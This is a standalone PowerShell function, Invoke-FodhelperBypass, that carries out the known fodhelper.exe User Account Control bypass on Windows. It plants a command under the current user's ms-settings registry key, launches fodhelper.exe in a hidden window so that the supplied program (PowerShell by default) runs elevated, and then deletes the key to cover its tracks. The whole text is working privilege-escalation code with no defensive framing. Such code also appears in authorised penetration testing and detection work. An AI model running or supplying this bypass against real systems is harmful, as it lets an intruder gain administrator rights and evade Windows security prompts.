Function Invoke-FodhelperBypass
{ 
    [CmdletBinding()]
        Param(
            [Parameter(
                Mandatory=$False,
                Position=0,
                ValueFromPipeLine=$True,
                ValueFromPipelineByPropertyName=$True,
                HelpMessage='Enter an executable you wish to execute to gain privesc. Default value is cmd /c start powershell.exe')]  # End Parameter
        [String]$Program = "cmd /c start powershell.exe")  # End param
 
    BEGIN 
    {
        
        Write-Verbose "Adding registry values..."
        
        New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\Command" -Force

        New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\Command" -Name "DelegateExecute" -Value "" -Force

        Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\Command" -Name "(default)" -Value $Program -Force

    }  # End BEGIN
    PROCESS 
    {
        
        Write-Verbose "Executing fodhelper.exe and $Program..."

        Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
        
    }  # End PROCESS 
    END 
    {

        Write-Verbose "Removing registry values as they should be no longer needed..."

        Start-Sleep -Seconds 3

        Remove-Item -Path "HKCU:\Software\Classes\ms-settings\" -Recurse -Force

    }  # End END

}  # End Function Invoke-FodHelperBypass
